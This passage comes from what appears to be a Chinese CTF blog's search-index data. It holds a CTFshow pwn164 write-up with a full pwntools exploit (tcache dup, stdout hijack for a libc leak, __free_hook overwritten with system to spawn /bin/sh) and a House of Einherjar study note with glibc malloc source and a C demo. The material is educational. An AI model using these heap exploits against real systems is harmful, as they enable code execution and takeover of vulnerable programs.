class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x140</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">[free() <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>)]</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&quot; &quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">add(<span class=\"number\">0x260</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x128</span>+p64(<span class=\"number\">0x131</span>)+p64(free_hook-<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&quot;/bin/sh;&quot;</span>+p64(system))</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n","excerpt":"","more":"<h1 id=\"CTFshow-pwn164-（tcache-dup）\"><a href=\"#CTFshow-pwn164-（tcache-dup）\" class=\"headerlink\" title=\"CTFshow pwn164 （tcache dup）\"></a>CTFshow pwn164 （tcache dup）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​        一步一步来吧，这是一道2.27版本的利用。同时是需要打__IO_2_1_stdout_去泄露libc地址的。但是难度不大，因为tcache bin 有些太拉胯了。给它一个uaf ，它可以自己double free 7次。这是什么？然后利用realloc 的一个特性，既可以malloc 又 可以 free。<br>​        <strong>七剑下天山</strong> 遇上 <strong>双料特工</strong> ，简直无敌了。</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"delete功能\"><a href=\"#delete功能\" class=\"headerlink\" title=\"delete功能\"></a>delete功能</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200643343.png\" alt=\"image-20250530200643343\"><br>1.典型的uaf 没有置空，但是ptr是哪来的?<br>2.继续看，add功能</p>\n<h3 id=\"add功能\"><a href=\"#add功能\" class=\"headerlink\" title=\"add功能\"></a>add功能</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200820909.png\" alt=\"image-20250530200820909\"><br>1.ptr在这里，也就是刚刚分配的堆块的指针。<br>2.realloc，一个很有问题的函数。当size不为0时且ptr不为空时：realloc 会检测ptr 的大小，如果ptr_size&gt;&#x3D;size，就重新分配，切割;否则，会先free ptr，再分配，然后两者都会返回分配的空间的指针。当size不为0且ptr为空时，与malloc等效，返回指针。当size为0且ptr不为空时，与free等效，并且返回空。size为0且ptr为空，梅栾邕。</p>\n<h3 id=\"神秘选项\"><a href=\"#神秘选项\" class=\"headerlink\" title=\"神秘选项\"></a>神秘选项</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530201556131.png\" alt=\"image-20250530201556131\"><br>1.一次置空ptr的机会</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.首先还是查看保护机制–全开。第一步还是老步骤，泄露libc。同样在这里只能通过unsorted bin中的堆块，来泄露。但是因为是2.27版本，所以需要先把tcache bin填满，才能让堆块进入unsorted bin。同时，此题没有show来打印，所以需要劫持__IO_2_1_stdout_ ，然后puts时，会把相关信息打出来。那么通过gdb 观察 stdout 的地址与main_arena的地址，修改低位两字节即可。这里需要注意一点。当我们把tcache bin 填满，且把这个堆块放入unsorted bin中后。如果直接add 这个堆块，是会把tcache bin 中的这个堆块申请出来的。如图：<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530210823813.png\" alt=\"image-20250530210823813\"></p>\n<p>2.如果要实现tcache dup 的话，应该是先把unsorted bin 中的这个堆块拿出来，并且覆盖fd针的低位，使得stdout被链入tcache bin 中。然后在把这两个堆块申清出来。所以我们要在这个堆块前面，申请一个堆块a。a堆块与我们这个堆块地址相邻，在申请前，先把a堆块申请出来，再申请两个堆块大小之和的堆块大小，这样a会先被free，然后与这个堆块合并再被分配出来。如图：<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530212136953.png\" alt=\"image-20250530212136953\"></p>\n<p>3.然后就是劫持stdout ，拿到libc后就是，同样的操作，去分配到free hook并篡改成system。同时在free hook -8 的位置布置”&#x2F;bin&#x2F;sh;” 最后free() 就可以触发，getshell了</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28309</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Size?\\n&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Content?\\n&quot;</span>,content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tozero</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1433233&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>) </span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 填满tcache bins</span></span><br><span class=\"line\">[free() <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x180</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x78</span>+p64(<span class=\"number\">0x41</span>)+p8(<span class=\"number\">0x60</span>)+p8(<span class=\"number\">0xc7</span>))</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 劫持IO</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,p64(<span class=\"number\">0xfbad1887</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p8(<span class=\"number\">0x58</span>))</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\x7f&quot;</span>,timeout=<span class=\"number\">0.1</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3e82a0</span></span><br><span class=\"line\"><span class=\"comment\">#libc_base = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x3e82a0</span></span><br><span class=\"line\">free_hook = libc_base + libc.sym[<span class=\"string\">&quot;__free_hook&quot;</span>]</span><br><span class=\"line\">system = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4f322</span></span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;free&quot;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"></span><br><span class=\"line\">tozero()</span><br><span class=\"line\">add(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x140</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">[free() <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>)]</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&quot; &quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">add(<span class=\"number\">0x260</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x128</span>+p64(<span class=\"number\">0x131</span>)+p64(free_hook-<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&quot;/bin/sh;&quot;</span>+p64(system))</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n"},{"title":"House of Einherjar","cover":"/img/齐天大圣.png","_content":"#  House of Einherjar\n## 前言 \n​\t总算是开始系统的梳理一遍堆溢出中的一个利用手法，也是很久没有写笔记了。这一片也是第一篇不是写题目做的笔记，是为了先看完所有的一个利用方法，再更好得去做题吧。\n​\t从这篇开始，依次做完23个demo的学习文章\n\n## 相关源码\n​\t**也是有源码分析了**文件路径(malloc/malloc.c)\n\n\n### consolidate backward\n```c\nif (!prev_inuse(p)) {\n      prevsize = p->prev_size;\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      unlink(av, p, bck, fwd);\n    }\n```\n​\t\t这段代码是向后合并的操作，p是刚刚被释放的堆块。如果它的prev_inuse位是0 的话(正常情况是上一个相邻堆块被释放)，就会执行这段代码。先把前一个堆块的大小(p->prev_size)赋给prevsize，把p的大小修改为两个堆块的大小之和。通过p的地址减去上一个堆块的大小，找到合并后，p应该在的地址，并更新p。再用新的p去执行unlink。\n\n### unlink\n```c\n#define unlink(AV, P, BK, FD) {                                            \\\n    FD = P->fd;\t\t\t\t\t\t\t\t      \\\n    BK = P->bk;\t\t\t\t\t\t\t\t      \\\n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t      \\\n      malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\\n    else {\t\t\t\t\t\t\t\t      \\\n        FD->bk = BK;\t\t\t\t\t\t\t      \\\n        BK->fd = FD;\t\t\t\t\t\t\t      \\\n        if (!in_smallbin_range (P->size)\t\t\t\t      \\\n            && __builtin_expect (P->fd_nextsize != NULL, 0)) {\t\t      \\\n\t    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t      \\\n\t\t|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \\\n\t      malloc_printerr (check_action,\t\t\t\t      \\\n\t\t\t       \"corrupted double-linked list (not small)\",    \\\n\t\t\t       P, AV);\t\t\t\t\t      \\\n            if (FD->fd_nextsize == NULL) {\t\t\t\t      \\\n                if (P->fd_nextsize == P)\t\t\t\t      \\\n                  FD->fd_nextsize = FD->bk_nextsize = FD;\t\t      \\\n                else {\t\t\t\t\t\t\t      \\\n                    FD->fd_nextsize = P->fd_nextsize;\t\t\t      \\\n                    FD->bk_nextsize = P->bk_nextsize;\t\t\t      \\\n                    P->fd_nextsize->bk_nextsize = FD;\t\t\t      \\\n                    P->bk_nextsize->fd_nextsize = FD;\t\t\t      \\\n                  }\t\t\t\t\t\t\t      \\\n              } else {\t\t\t\t\t\t\t      \\\n                P->fd_nextsize->bk_nextsize = P->bk_nextsize;\t\t      \\\n                P->bk_nextsize->fd_nextsize = P->fd_nextsize;\t\t      \\\n              }\t\t\t\t\t\t\t\t      \\\n          }\t\t\t\t\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n}\n```\n​\tunlink操作在这里没有具体的利用，我们只是最后需要绕过这样的一个检测。让它可以正常进行合并。关于unlink前半部分的代码，会在unlink专属的文章中介绍。这里第9行是针对lagebin的一个检测，而在我们这个利用手法中，基本都是lagebin，所以我们需要对这个fd_nextsize和bk_nextsize,做一个绕过的检测。因为当lagebin中只有一个堆块时，fd_nextsize和bk_nextsize,都指p自己，所以我们把这两个设置为p的地址即可。\n\n### consolidate into top\n```c\nelse {\n      size += nextsize;\n      set_head(p, size | PREV_INUSE);\n      av->top = p;\n      check_chunk(av, p);\n    }\n```\n\n​\t这段就是就是把与topchunk 相邻的空闲堆块与top chunk合并。并更新top chunk的大小和地址。\n\n## 原理和条件\n### 原理\n​\t其实原理，我觉得就是指利用的思路，并不是单纯的指源码的操作，这不是我们利用手法的原理。\n​\t这里是这样，利用某些手段伪造出一个fakechunk，这个chunk位于我们想要分配的目的地址上(记为target)。 同时，我们利用可以正常分配到的一个 chunk (记为p)。通过修改p 的 prevsize和pre_inuse,让p 和target 合并为一个堆块，当然p本身是与topchunk相邻的。此时，target 和 p 都被 topchunk 合并为新的topchunk。此时topchunk 的地址，就迁移到了 target 所在的地址。那么再次分配堆地址，就可以把这个空间分配到手。\n\n### 条件\n​\t1.伪造fakechunk ，需要泄露 栈地址和堆地址。总之要能泄露地址\n​\t2.off-by-one 或off-by-null，要能修改pre_inuse。\n\n## demo\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <malloc.h>\n\nint main()\n{\n\tsetbuf(stdin,NULL);\n\tsetbuf(stdout,NULL);\n\n\tuint8_t* a;\n\tuint8_t* b;\n\tuint8_t* c;\n\n\ta=(uint8_t*)malloc(0x38);/*假设，我们要利用a去溢出到下一个堆块。*/\n\tsize_t* a_addr=(size_t *)(a-sizeof(size_t)*2);\n\tsize_t  a_size=malloc_usable_size(a);\n\tprintf(\"\\033[1;33m这里，我们申清一个堆块a,假设存在溢出漏洞。需要通过a去溢出：\\033[0m\\n\");\n\tprintf(\"a的地址(包含chunk头)：%p\\n\",a_addr);\n\tprintf(\"a的大小(不含chunk头)：%lx\\n\\n\",a_size);\n        \n\tsize_t fakechunk[6];/*这里，我们通过某种方法伪造了fakechunk。*/\n\tfakechunk[0]=0x100,fakechunk[1]=0x100;\n\tfakechunk[2]=(size_t)fakechunk;\n\tfakechunk[3]=(size_t)fakechunk;\n\tfakechunk[4]=(size_t)fakechunk;\n\tfakechunk[5]=(size_t)fakechunk;\n\tprintf(\"\\033[1;33m假设，我们通过某种方法，构造了如下的一个fakechunk：\\033[0m\\n\");\n\tprintf(\"fakechunk的地址(包含chunk头)：%p\\n\",fakechunk);\n\tprintf(\"fd: %#lx\\n\",fakechunk[2]);\n\tprintf(\"bk: %#lx\\n\",fakechunk[3]);\n\tprintf(\"fd_nextsize: %#lx\\n\",fakechunk[4]);\n\tprintf(\"bk_nextsize: %#lx\\n\\n\",fakechunk[5]);\n\t\n\tb=(uint8_t*)malloc(0xf8);/*这就是要触发，向后合并和topchunk合并的堆块.*/\n\tsize_t* b_size_ptr=(size_t*)(b-sizeof(size_t));/*指向 chunk b 的size位.*/\n\tsize_t* b_addr=(size_t *)(b-sizeof(size_t)*2);/*同时也是 chunk b 的prev_size*/\n\tprintf(\"\\033[1;33m这里创建一个堆块b,作为合并的关键堆块:\\033[0m\\n\");\n\tprintf(\"b的地址(含chunk头)： %p\\n\",b_addr);\n\tprintf(\"b的size位：%#lx\\n\\b\",*b_size_ptr);\n\tprintf(\"b的prev_size: %#lx\\n\\n\",*b_addr);\n\t/*\n\t接下来就是修改size和prev_size\n\t这里本来是想直接利用b相关的指针去修改b的size 和 prev_size，但是\n\t这样做体现不出通过a的溢出漏洞来修改，所以还是使用a相关的指针去修改。\n\t*/\n\tprintf(\"\\033[1;33m那么，对于现在创建的堆块b，我们可以通过溢出去修改它的一些数据:\\033[0m\\n\");\n\ta[a_size]=0;\n\tprintf(\"修改后b的size位：%#lx\\n\",*b_size_ptr);\n\t\n\t/*\n\t接下来是计算，计算fakechunk的大小。fakechunk的大小当然不是0x100,\n\t它应该是从fakechunk到b中间这么大的一块区域\n\t*/\n\tsize_t fakesize=(size_t)((uint8_t *)(b_addr)-(uint8_t *)fakechunk);\n\tprintf(\"b的prev_size应该用 b 的地址减 fakechunk 的地址: %p-%p=%#lx\\n\",b_addr,fakechunk,fakesize);\n\t*(size_t *)&a[a_size-sizeof(size_t)]=fakesize;\n\tprintf(\"修改后b的prev_size: %#lx\\n\\n\",*b_addr);\n\t/*为了正确的合并，fakechunk的size需要和prev_size对应上*/\n\tfakechunk[1]=fakesize;\n\t/*触发合并*/\n\tfree(b);\n\tprintf(\"合并后fakechunk的size: %#lx\\n\",fakechunk[1]);\n\tprintf(\"是b.size+b.prev_szie+b.next_szie(也就是topchunk的大小)得来的\\n\");\n\t/*最后看分配到了哪里*/\n\tc=(uint8_t*)malloc(0x200);\n\tsize_t* c_addr=(size_t *)(c-sizeof(size_t)*2);\n\tprintf(\"\\033[1;33m最后申清一个堆块c,并查看一下是否达到了我们的目的:\\033[0m\\n\");\n\tprintf(\"c的地址(包含chunk头)：%p\\n\",c_addr);\n}\n```\n### 说明\n​\t请在ubuntu16下编译(即使用glibc-2.23)。编译时记得关掉pie，这样便于打断点。\n​\t编译时参数(只能在64位下编译)\n```\ngcc -ggdb demo.c -o demo -z execstack -fno-stack-protector -no-pie -z norelro\n```\n​\t这个demo是自己写的，在how2heap的基础上添加了一些基础的描述。希望可以更清楚的表达出，漏洞利的一个思路。同时，关于合并后的size大小，这里描述也做了修改。因为合并是b和fakechunk以及topchunk，所以最后的大小理论上也是三个堆块的大小相加。\n![image-20250622133210334](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622133210334.png)\n​\t事实上，也确实如此\n\n### 逐步演示\n#### 创建a堆块\n![image-20250622140529903](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140529903.png)\n![image-20250622140615994](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140615994.png)\n\n#### 伪造fakechunk\n![image-20250622140854930](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140854930.png)\n#### 创建b堆块\n![image-20250622](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141009181.png)\n#### 篡改b的size的pre_inuse 位\n![image-20250622141342243](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141342243.png)\n#### 篡改b的prev_size \n![image-20250622141504102](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141504102.png)\n#### 修改fakechunk的size\n![image-20250622141624553](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141624553.png)\n#### free(b)\n![image-20250622143101805](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622143101805.png)","source":"_posts/heap/House of  Einherjar.md","raw":"---\ntitle: House of Einherjar\ntags:\n    - pwn\n    - House of XXX\ncategories:\n    - 学习笔记\ncover: /img/齐天大圣.png\n---\n#  House of Einherjar\n## 前言 \n​\t总算是开始系统的梳理一遍堆溢出中的一个利用手法，也是很久没有写笔记了。这一片也是第一篇不是写题目做的笔记，是为了先看完所有的一个利用方法，再更好得去做题吧。\n​\t从这篇开始，依次做完23个demo的学习文章\n\n## 相关源码\n​\t**也是有源码分析了**文件路径(malloc/malloc.c)\n\n\n### consolidate backward\n```c\nif (!prev_inuse(p)) {\n      prevsize = p->prev_size;\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      unlink(av, p, bck, fwd);\n    }\n```\n​\t\t这段代码是向后合并的操作，p是刚刚被释放的堆块。如果它的prev_inuse位是0 的话(正常情况是上一个相邻堆块被释放)，就会执行这段代码。先把前一个堆块的大小(p->prev_size)赋给prevsize，把p的大小修改为两个堆块的大小之和。通过p的地址减去上一个堆块的大小，找到合并后，p应该在的地址，并更新p。再用新的p去执行unlink。\n\n### unlink\n```c\n#define unlink(AV, P, BK, FD) {                                            \\\n    FD = P->fd;\t\t\t\t\t\t\t\t      \\\n    BK = P->bk;\t\t\t\t\t\t\t\t      \\\n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t      \\\n      malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\\n    else {\t\t\t\t\t\t\t\t      \\\n        FD->bk = BK;\t\t\t\t\t\t\t      \\\n        BK->fd = FD;\t\t\t\t\t\t\t      \\\n        if (!in_smallbin_range (P->size)\t\t\t\t      \\\n            && __builtin_expect (P->fd_nextsize != NULL, 0)) {\t\t      \\\n\t    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t      \\\n\t\t|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \\\n\t      malloc_printerr (check_action,\t\t\t\t      \\\n\t\t\t       \"corrupted double-linked list (not small)\",    \\\n\t\t\t       P, AV);\t\t\t\t\t      \\\n            if (FD->fd_nextsize == NULL) {\t\t\t\t      \\\n                if (P->fd_nextsize == P)\t\t\t\t      \\\n                  FD->fd_nextsize = FD->bk_nextsize = FD;\t\t      \\\n                else {\t\t\t\t\t\t\t      \\\n                    FD->fd_nextsize = P->fd_nextsize;\t\t\t      \\\n                    FD->bk_nextsize = P->bk_nextsize;\t\t\t      \\\n                    P->fd_nextsize->bk_nextsize = FD;\t\t\t      \\\n                    P->bk_nextsize->fd_nextsize = FD;\t\t\t      \\\n                  }\t\t\t\t\t\t\t      \\\n              } else {\t\t\t\t\t\t\t      \\\n                P->fd_nextsize->bk_nextsize = P->bk_nextsize;\t\t      \\\n                P->bk_nextsize->fd_nextsize = P->fd_nextsize;\t\t      \\\n              }\t\t\t\t\t\t\t\t      \\\n          }\t\t\t\t\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n}\n```\n​\tunlink操作在这里没有具体的利用，我们只是最后需要绕过这样的一个检测。让它可以正常进行合并。关于unlink前半部分的代码，会在unlink专属的文章中介绍。这里第9行是针对lagebin的一个检测，而在我们这个利用手法中，基本都是lagebin，所以我们需要对这个fd_nextsize和bk_nextsize,做一个绕过的检测。因为当lagebin中只有一个堆块时，fd_nextsize和bk_nextsize,都指p自己，所以我们把这两个设置为p的地址即可。\n\n### consolidate into top\n```c\nelse {\n      size += nextsize;\n      set_head(p, size | PREV_INUSE);\n      av->top = p;\n      check_chunk(av, p);\n    }\n```\n\n​\t这段就是就是把与topchunk 相邻的空闲堆块与top chunk合并。并更新top chunk的大小和地址。\n\n## 原理和条件\n### 原理\n​\t其实原理，我觉得就是指利用的思路，并不是单纯的指源码的操作，这不是我们利用手法的原理。\n​\t这里是这样，利用某些手段伪造出一个fakechunk，这个chunk位于我们想要分配的目的地址上(记为target)。 同时，我们利用可以正常分配到的一个 chunk (记为p)。通过修改p 的 prevsize和pre_inuse,让p 和target 合并为一个堆块，当然p本身是与topchunk相邻的。此时，target 和 p 都被 topchunk 合并为新的topchunk。此时topchunk 的地址，就迁移到了 target 所在的地址。那么再次分配堆地址，就可以把这个空间分配到手。\n\n### 条件\n​\t1.伪造fakechunk ，需要泄露 栈地址和堆地址。总之要能泄露地址\n​\t2.off-by-one 或off-by-null，要能修改pre_inuse。\n\n## demo\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <malloc.h>\n\nint main()\n{\n\tsetbuf(stdin,NULL);\n\tsetbuf(stdout,NULL);\n\n\tuint8_t* a;\n\tuint8_t* b;\n\tuint8_t* c;\n\n\ta=(uint8_t*)malloc(0x38);/*假设，我们要利用a去溢出到下一个堆块。*/\n\tsize_t* a_addr=(size_t *)(a-sizeof(size_t)*2);\n\tsize_t  a_size=malloc_usable_size(a);\n\tprintf(\"\\033[1;33m这里，我们申清一个堆块a,假设存在溢出漏洞。需要通过a去溢出：\\033[0m\\n\");\n\tprintf(\"a的地址(包含chunk头)：%p\\n\",a_addr);\n\tprintf(\"a的大小(不含chunk头)：%lx\\n\\n\",a_size);\n        \n\tsize_t 